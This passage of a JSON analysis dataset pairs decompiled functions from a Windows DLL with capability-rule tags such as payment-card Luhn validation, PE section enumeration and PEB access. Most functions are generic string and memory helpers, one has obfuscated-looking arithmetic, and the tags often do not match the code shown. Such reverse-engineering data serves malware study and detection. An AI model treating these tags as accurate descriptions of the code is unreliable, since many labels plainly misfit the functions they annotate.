            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.10001c70(uint param_1, uint32_t param_2)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint16_t uVar7;\n    \n    uVar4 = *0x10040986;\n    if (*0x100409ae == 0xb61) {\n        uVar4 = (*0x1004099c + *0x10040986) * '\\x02' + 0xbd;\n    }\n    if (*0x10040994 + *0x100409b0 != 0x130) {\n        *0x100409a4 = *0x100409a4 + (uVar4 - 0x43);\n    }\n    piVar1 = 0x100409ec;\n    uVar4 = uVar4 * '\\x02' + 0xbd;\n    do {\n        if (uVar4 == *0x100409a4) break;\n        *piVar1 = *piVar1 + -0x48;\n        piVar1 = piVar1 + -1;\n    } while (0x10040992 < piVar1);\n    uVar6 = *0x100409b4 & 0xffff;\n    uVar7 = *0x100409a4;\n    if (uVar6 <= param_2) {\n        uVar7 = uVar4;\n    }\n    *0x100409a4 = uVar7;\n    fcn.1000d4c0(0x10042630, 0x10037330, 0x29b0);\n    cVar2 = -0x51;\n    uVar5 = 0x43 - *0x100409b4 & 0xffff;\n    uVar4 = *0x100409b4 * -0x55 + 0xaf;\n    if (uVar6 <= uVar5) {\n        uVar7 = uVar4;\n        *0x100409a4 = uVar4;\n        cVar2 = (uVar5 * -3 + -0x61) - uVar4;\n    }\n    iVar3 = *0x10040980 + 0x3e;\n    if (*0x100409ae == 0xb61) {\n        iVar3 = (*0x1004099c + iVar3) * 2 + 0xe5bd;\n    }\n    uVar4 = iVar3 + cVar2 + '\\x01';\n    if (*0x10040994 + *0x100409b0 != 0x130) {\n        *0x100409a4 = uVar7 + (uVar4 - 0x43);\n    }\n    *0x10040986 = uVar4 * '\\x02' + 0xbd;\n    if (uVar6 < 0x49) {\n        *0x100409a4 = *0x10040986;\n    }\n    *0x10040984 = (0x43 - *0x100409b4) + -0x19fb;\n    *0x100409b4 = iVar3;\n    return 0x10042630;\n}\n",
        "token_count": 717
    },
    "10002090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "PEB access",
            "access PEB ldr_data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10002090(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002a7eb;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    in_ECX[2] = arg_10h;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    *(in_ECX + 5) = 0;\n    in_ECX[6] = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    in_ECX[10] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xc] = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0xf] = 0;\n    in_ECX[0x10] = 0;\n    *(in_ECX + 0x11) = 0;\n    var_4h = 0;\n    cVar1 = fcn.10003100(*in_ECX, in_ECX[1], in_ECX[3], *in_ECX);\n    if (cVar1 == '\\0') {\n        in_ECX[2] = 0;\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 406
    },
    "100021d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100021d0(uint32_t **param_1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    \n    if (param_1[5] < 0x10) goto code_r0x10002208;\n    puVar1 = *param_1;\n    puVar3 = puVar1;\n    if (param_1[5] + 1U < 0x1000) {\ncode_r0x100021ff:\n        fcn.1000acc8(puVar3);\ncode_r0x10002208:\n        param_1[5] = 0xf;\n        param_1[4] = NULL;\n        if (0xf < param_1[5]) {\n            param_1 = *param_1;\n        }\n        *param_1 = 0;\n        return;\n    }\n    if ((puVar1 & 0x1f) == 0) {\n        puVar3 = puVar1[-1];\n        if (puVar1 <= puVar3) goto code_r0x10002228;\n        if (3 < puVar1 - puVar3) {\n            if (0x23 < puVar1 - puVar3) goto code_r0x10002232;\n            goto code_r0x100021ff;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10002228:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10002232:\n    fcn.10010ddf();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 374
    },
    "10002240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.10002240(uint *param_1, uint *param_2)\n\n{\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    if (param_2[5] < 0x10) {\n        if (param_2[4] + 1 != 0) {\n            fcn.1000bc90(param_1, param_2, param_2[4] + 1);\n        }\n    }\n    else {\n        *param_1 = *param_2;\n        *param_2 = 0;\n    }\n    param_1[4] = param_2[4];\n    param_1[5] = param_2[5];\n    param_2[5] = 0xf;\n    param_2[4] = 0;\n    if (0xf < param_2[5]) {\n        **param_2 = 0;\n        return param_1;\n    }\n    *param_2 = 0;\n    return param_1;\n}\n",
        "token_count": 242
    },
    "100022c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.100022c0(int32_t **param_1, int32_t **param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    \n    if (param_2 != NULL) {\n        piVar1 = param_1[5];\n        ppiVar3 = param_1;\n        if (0x7 < piVar1) {\n            ppiVar3 = *param_1;\n        }\n        if (ppiVar3 <= param_2) {\n            ppiVar3 = param_1;\n            if (0x7 < piVar1) {\n                ppiVar3 = *param_1;\n            }\n            if (param_2 < ppiVar3 + param_1[4] * 2) {\n                ppiVar3 = param_1;\n                if (0x7 < piVar1) {\n                    ppiVar3 = *param_1;\n                }\n                ppiVar3 = fcn.10002720(param_1, param_2 - ppiVar3 >> 1, param_3);\n                return ppiVar3;\n            }\n        }\n    }\n    if (0x7ffffffe < param_3) {\n        fcn.1000a1f1(0x1003d144);\n        pcVar2 = swi(3);\n        ppiVar3 = (*pcVar2)();\n        return ppiVar3;\n    }\n    if (param_1[5] < param_3) {\n        fcn.10002a90(param_3, param_1[4]);\n        if (param_3 == NULL) {\n            return param_1;\n        }\n    }\n    else if (param_3 == NULL) {\n        param_1[4] = NULL;\n        if (0x7 < param_1[5]) {\n            **param_1 = 0;\n            return param_1;\n        }\n        *param_1 = 0;\n        return param_1;\n    }\n    ppiVar3 = param_1;\n    if (0x7 < param_1[5]) {\n        ppiVar3 = *param_1;\n    }\n    if (param_3 != NULL) {\n        fcn.1000d4c0(ppiVar3, param_2, param_3 * 2);\n    }\n    param_1[4] = param_3;\n    if (param_1[5] < 0x8) {\n        *(param_1 + param_3 * 2) = 0;\n        return param_1;\n    }\n    *(*param_1 + param_3 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 607
    },
    "10002450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.10002450(int32_t **param_1, int32_t **param_2, int32_t *param_3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    \n    if (param_2 != NULL) {\n        piVar1 = param_1[5];\n        ppiVar3 = param_1;\n        if (0xf < piVar1) {\n            ppiVar3 = *param_1;\n        }\n        if (ppiVar3 <= param_2) {\n            ppiVar3 = param_1;\n            if (0xf < piVar1) {\n                ppiVar3 = *param_1;\n            }\n            if (param_2 < param_1[4] + ppiVar3) {\n                if (0xf < piVar1) {\n                    ppiVar3 = fcn.10002550(param_1, param_2 - *param_1, param_3);\n                    return ppiVar3;\n                }\n                ppiVar3 = fcn.10002550(param_1, param_2 - param_1, param_3);\n                return ppiVar3;\n            }\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.1000a1f1(0x1003d144);\n        pcVar2 = swi(3);\n        ppiVar3 = (*pcVar2)();\n        return ppiVar3;\n    }\n    if (param_1[5] < param_3) {\n        fcn.10002cf0(param_3, param_1[4]);\n        if (param_3 == NULL) {\n            return param_1;\n        }\n    }\n    else if (param_3 == NULL) {\n        param_1[4] = NULL;\n        if (0xf < param_1[5]) {\n            **param_1 = 0;\n            return param_1;\n        }\n        *param_1 = 0;\n        return param_1;\n    }\n    ppiVar3 = param_1;\n    if (0xf < param_1[5]) {\n        ppiVar3 = *param_1;\n    }\n    if (param_3 != NULL) {\n        fcn.1000d4c0(ppiVar3, param_2, param_3);\n    }\n    param_1[4] = param_3;\n    if (param_1[5] < 0x10) {\n        *(param_1 + param_3) = 0;\n        return param_1;\n    }\n    *(*param_1 + param_3) = 0;\n    return param_1;\n}\n",
        "token_count": 598
    },
    "10002550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.10002550(int32_t **param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    if (param_2[4] < param_3) {\n        fcn.1000a211(\"invalid string position\");\n    }\n    else {\n        piVar2 = param_2[4] - param_3;\n        if (piVar2 < param_4) {\n            param_4 = piVar2;\n        }\n        if (param_1 != param_2) {\n            if (param_4 != 0xffffffff) {\n                if (param_1[5] < param_4) {\n                    fcn.10002cf0(param_4, param_1[4]);\n                    if (param_4 == NULL) {\n                        return param_1;\n                    }\n                }\n                else if (param_4 == NULL) {\n                    param_1[4] = NULL;\n                    if (0xf < param_1[5]) {\n                        **param_1 = 0;\n                        return param_1;\n                    }\n                    *param_1 = 0;\n                    return param_1;\n                }\n                if (0xf < param_2[5]) {\n                    param_2 = *param_2;\n                }\n                ppiVar3 = param_1;\n                if (0xf < param_1[5]) {\n                    ppiVar3 = *param_1;\n                }\n                if (param_4 != NULL) {\n                    fcn.1000d4c0(ppiVar3, param_2 + param_3, param_4);\n                }\n                param_1[4] = param_4;\n                if (param_1[5] < 0x10) {\n                    *(param_1 + param_4) = 0;\n                    return param_1;\n                }\n                *(*param_1 + param_4) = 0;\n                return param_1;\n            }\n            goto code_r0x10002649;\n        }\n        param_4 = param_4 + param_3;\n        if (param_4 <= param_1[4]) {\n            param_1[4] = param_4;\n            ppiVar3 = param_1;\n            if (0xf < param_1[5]) {\n                ppiVar3 = *param_1;\n            }\n            *(ppiVar3 + param_4) = 0;\n            fcn.10002840(0, param_3);\n            return param_1;\n        }\n    }\n    fcn.1000a211(\"invalid string position\");\ncode_r0x10002649:\n    fcn.1000a1f1(0x1003d144);\n    pcVar1 = swi(3);\n    ppiVar3 = (*pcVar1)();\n    return ppiVar3;\n}\n",
        "token_count": 654
    },
    "100026c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.100026c0(uint32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if (param_2 < 0x80000000) {\n        uVar2 = param_1;\n        if (param_2 * 2 < 0x1000) {\ncode_r0x100026f2:\n            fcn.1000acc8(uVar2);\n            return;\n        }\n        if ((param_1 & 0x1f) != 0) goto code_r0x10002701;\n        uVar2 = *(param_1 - 4);\n        if (param_1 <= uVar2) goto code_r0x10002706;\n        if (3 < param_1 - uVar2) {\n            if (param_1 - uVar2 < 0x24) goto code_r0x100026f2;\n            goto code_r0x10002710;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10002701:\n        fcn.10010ddf();\ncode_r0x10002706:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10002710:\n    fcn.10010ddf();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 309
    },
    "10002720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.10002720(int32_t **param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    if (param_2[4] < param_3) {\n        fcn.1000a211(\"invalid string position\");\n    }\n    else {\n        piVar2 = param_2[4] - param_3;\n        if (piVar2 < param_4) {\n            param_4 = piVar2;\n        }\n        if (param_1 != param_2) {\n            if (param_4 < 0x7fffffff) {\n                if (param_1[5] < param_4) {\n                    fcn.10002a90(param_4, param_1[4]);\n                    if (param_4 == NULL) {\n                        return param_1;\n                    }\n                }\n                else if (param_4 == NULL) {\n                    param_1[4] = NULL;\n                    if (0x7 < param_1[5]) {\n                        **param_1 = 0;\n                        return param_1;\n                    }\n                    *param_1 = 0;\n                    return param_1;\n                }\n                if (0x7 < param_2[5]) {\n                    param_2 = *param_2;\n                }\n                ppiVar3 = param_1;\n                if (0x7 < param_1[5]) {\n                    ppiVar3 = *param_1;\n                }\n                if (param_4 != NULL) {\n                    fcn.1000d4c0(ppiVar3, param_2 + param_3 * 2, param_4 * 2);\n                }\n                param_1[4] = param_4;\n                if (param_1[5] < 0x8) {\n                    *(param_1 + param_4 * 2) = 0;\n                    return param_1;\n                }\n                *(*param_1 + param_4 * 2) = 0;\n                return param_1;\n            }\n            goto code_r0x10002828;\n        }\n        param_4 = param_4 + param_3;\n        if (param_4 <= param_1[4]) {\n            param_1[4] = param_4;\n            ppiVar3 = param_1;\n            if (0x7 < param_1[5]) {\n                ppiVar3 = *param_1;\n            }\n            *(ppiVar3 + param_4 * 2) = 0;\n            fcn.10002c40(0, param_3);\n            return param_1;\n        }\n    }\n    fcn.1000a211(\"invalid string position\");\ncode_r0x10002828:\n    fcn.1000a1f1(0x1003d144);\n    pcVar1 = swi(3);\n    ppiVar3 = (*pcVar1)();\n    return ppiVar3;\n}\n",
        "token_count": 676
    },
    "10002840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.10002840(int32_t **param_1, int32_t *param_2, uint32_t param_3)\n\n{\n    code *pcVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[4];\n    if (piVar3 < param_2) {\n        fcn.1000a211(\"invalid string position\");\n        pcVar1 = swi(3);\n        ppiVar2 = (*pcVar1)();\n        return ppiVar2;\n    }\n    if (param_3 < piVar3 - param_2) {\n        if (param_3 != 0) {\n            ppiVar2 = param_1;\n            if (0xf < param_1[5]) {\n                ppiVar2 = *param_1;\n            }\n            piVar3 = piVar3 - param_3;\n            if (piVar3 - param_2 != 0) {\n                fcn.1000bc90(ppiVar2 + param_2, ppiVar2 + param_2 + param_3, piVar3 - param_2);\n            }\n            param_1[4] = piVar3;\n            if (0xf < param_1[5]) {\n                *(*param_1 + piVar3) = 0;\n                return param_1;\n            }\n            *(param_1 + piVar3) = 0;\n        }\n        return param_1;\n    }\n    param_1[4] = param_2;\n    if (param_1[5] < 0x10) {\n        *(param_1 + param_2) = 0;\n        return param_1;\n    }\n    *(*param_1 + param_2) = 0;\n    return param_1;\n}\n",
        "token_count": 402
    },
    "10002c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.10002c40(int32_t **param_1, int32_t *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    \n    piVar4 = param_1[4];\n    if (piVar4 < param_2) {\n        fcn.1000a211(\"invalid string position\");\n        pcVar2 = swi(3);\n        ppiVar3 = (*pcVar2)();\n        return ppiVar3;\n    }\n    if (param_3 < piVar4 - param_2) {\n        if (param_3 != 0) {\n            ppiVar3 = param_1;\n            if (0x7 < param_1[5]) {\n                ppiVar3 = *param_1;\n            }\n            piVar4 = piVar4 - param_3;\n            iVar1 = ppiVar3 + param_2 * 2;\n            if (piVar4 - param_2 != 0) {\n                fcn.1000bc90(iVar1, iVar1 + param_3 * 2, (piVar4 - param_2) * 2);\n            }\n            param_1[4] = piVar4;\n            if (0x7 < param_1[5]) {\n                *(*param_1 + piVar4 * 2) = 0;\n                return param_1;\n            }\n            *(param_1 + piVar4 * 2) = 0;\n        }\n        return param_1;\n    }\n    param_1[4] = param_2;\n    if (param_1[5] < 0x8) {\n        *(param_1 + param_2 * 2) = 0;\n        return param_1;\n    }\n    *(*param_1 + param_2 * 2) = 0;\n    return param_1;\n}\n",
        "token_count": 438
    },
    "10002ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.10002ed0(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (param_1 == 0) {\n        return 0;\n    }\n    if (param_1 < 0x80000000) {\n        param_1 = param_1 * 2;\n        if (param_1 < 0x1000) {\n            uVar3 = fcn.1000ac95(param_1);\n            return uVar3;\n        }\n        if (param_1 < param_1 + 0x23) {\n            iVar2 = fcn.1000ac95(param_1 + 0x23);\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n    }\n    else {\n        fcn.1000b73a();\n    }\n    fcn.1000b73a();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 257
    },
    "10002f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.10002f30(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (param_1 == 0) {\n        return 0;\n    }\n    if (0xfff < param_1) {\n        if (param_1 < param_1 + 0x23) {\n            iVar2 = fcn.1000ac95(param_1 + 0x23);\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n        fcn.1000b73a();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    uVar3 = fcn.1000ac95(param_1);\n    return uVar3;\n}\n",
        "token_count": 210
    },
    "10002f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10002f80(uint *param_1, uint *param_2)\n\n{\n    if (param_2[5] < 8) {\n        if (param_2[4] + 1 != 0) {\n            fcn.1000bc90(param_1, param_2, (param_2[4] + 1) * 2);\n        }\n    }\n    else {\n        if (param_1 != NULL) {\n            *param_1 = *param_2;\n        }\n        *param_2 = 0;\n    }\n    param_1[4] = param_2[4];\n    param_1[5] = param_2[5];\n    param_2[5] = 7;\n    param_2[4] = 0;\n    if (7 < param_2[5]) {\n        **param_2 = 0;\n        return;\n    }\n    *param_2 = 0;\n    return;\n}\n",
        "token_count": 217
    },
    "100037e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100037e0(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *param_1;\n    if (uVar1 == 0) {\n        return;\n    }\n    uVar3 = param_1[2] - uVar1 >> 3;\n    if (uVar3 < 0x20000000) {\n        uVar4 = uVar1;\n        if (uVar3 << 3 < 0x1000) {\ncode_r0x1000381c:\n            fcn.1000acc8(uVar4);\n            *param_1 = 0;\n            param_1[1] = 0;\n            param_1[2] = 0;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x10003840;\n        uVar4 = *(uVar1 - 4);\n        if (uVar1 <= uVar4) goto code_r0x10003845;\n        if (3 < uVar1 - uVar4) {\n            if (uVar1 - uVar4 < 0x24) goto code_r0x1000381c;\n            goto code_r0x1000384f;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10003840:\n        fcn.10010ddf();\ncode_r0x10003845:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x1000384f:\n    fcn.10010ddf();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 399
    },
    "10003860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10003860(int32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = param_1[1] - *param_1 >> 3;\n    if (param_2 < uVar1) {\n        param_1[1] = param_1[1] + (param_2 - uVar1) * 8;\n        return;\n    }\n    if (uVar1 < param_2) {\n        fcn.10003920(param_2 - uVar1);\n        fcn.10005c90(param_1[1], unaff_retaddr);\n        param_1[1] = param_1[1] + (param_2 - (param_1[1] - *param_1 >> 3)) * 8;\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "10003980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10003980(uint32_t *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (param_2 == 0) {\n        uVar7 = 0;\ncode_r0x100039d5:\n        fcn.1000bc90(uVar7, *param_1, param_1[1] - *param_1);\n        uVar1 = *param_1;\n        uVar2 = param_1[1];\n        if (uVar1 == 0) goto code_r0x10003a32;\n        uVar5 = param_1[2] - uVar1 >> 3;\n        if (0x1fffffff < uVar5) goto code_r0x10003a51;\n        uVar6 = uVar1;\n        if (uVar5 << 3 < 0x1000) {\ncode_r0x10003a29:\n            fcn.1000acc8(uVar6);\ncode_r0x10003a32:\n            param_1[2] = uVar7 + param_2 * 8;\n            param_1[1] = uVar7 + (uVar2 - uVar1 >> 3) * 8;\n            *param_1 = uVar7;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x10003a56;\n        uVar6 = *(uVar1 - 4);\n        if (uVar1 <= uVar6) goto code_r0x10003a5b;\n        if (3 < uVar1 - uVar6) {\n            if (0x23 < uVar1 - uVar6) goto code_r0x10003a65;\n            goto code_r0x10003a29;\n        }\n    }\n    else {\n        if (param_2 < 0x20000000) {\n            uVar7 = param_2 * 8;\n            if (uVar7 < 0x1000) {\n                uVar7 = fcn.1000ac95(uVar7);\n            }\n            else {\n                if (uVar7 + 0x23 <= uVar7) goto code_r0x10003a4c;\n                iVar4 = fcn.1000ac95(uVar7 + 0x23);\n                uVar7 = iVar4 + 0x23U & 0xffffffe0;\n                *(uVar7 - 4) = iVar4;\n            }\n            goto code_r0x100039d5;\n        }\n        fcn.1000b73a();\ncode_r0x10003a4c:\n        fcn.1000b73a();\ncode_r0x10003a51:\n        fcn.10010ddf();\ncode_r0x10003a56:\n        fcn.10010ddf();\ncode_r0x10003a5b:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10003a65:\n    fcn.10010ddf();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 744
    },
    "10003a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10003a70(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *param_1;\n    if (uVar1 == 0) {\n        return;\n    }\n    uVar3 = param_1[2] - uVar1 >> 2;\n    if (uVar3 < 0x40000000) {\n        uVar4 = uVar1;\n        if (uVar3 << 2 < 0x1000) {\ncode_r0x10003aac:\n            fcn.1000acc8(uVar4);\n            *param_1 = 0;\n            param_1[1] = 0;\n            param_1[2] = 0;\n            return;\n        }\n        if ((uVar1 & 0x1f) != 0) goto code_r0x10003ad0;\n        uVar4 = *(uVar1 - 4);\n        if (uVar1 <= uVar4) goto code_r0x10003ad5;\n        if (3 < uVar1 - uVar4) {\n            if (uVar1 - uVar4 < 0x24) goto code_r0x10003aac;\n            goto code_r0x10003adf;\n        }\n    }\n    else {\n        fcn.10010ddf();\ncode_r0x10003ad0:\n        fcn.10010ddf();\ncode_r0x10003ad5:\n        fcn.10010ddf();\n    }\n    fcn.10010ddf();\ncode_r0x10003adf:\n    fcn.10010ddf();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 399
    },
    "10003b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10003b50(int32_t *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint unaff_retaddr;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    if (param_2 != 0) {\n        if (0x3fffffff < param_2) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = fcn.10003c30(param_2);\n        *param_1 = iVar2;\n        param_1[1] = iVar2;\n        param_1[2] = *param_1 + param_2 * 4;\n        iVar2 = *param_1;\n        fcn.10005cb0(param_2, extraout_ECX, unaff_retaddr);\n        param_1[1] = param_2 * 4 + iVar2;\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "10003c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.10003c30(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (param_1 == 0) {\n        return 0;\n    }\n    if (param_1 < 0x40000000) {\n        param_1 = param_1 * 4;\n        if (param_1 < 0x1000) {\n            uVar3 = fcn.1000ac95(param_1);\n            return uVar3;\n        }\n        if (param_1 < param_1 + 0x23) {\n            iVar2 = fcn.1000ac95(param_1 + 0x23);\n            uVar3 = iVar2 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar2;\n            return uVar3;\n        }\n    }\n    else {\n        fcn.1000b73a();\n    }\n    fcn.1000b73a();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 257
    },
    "10004190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
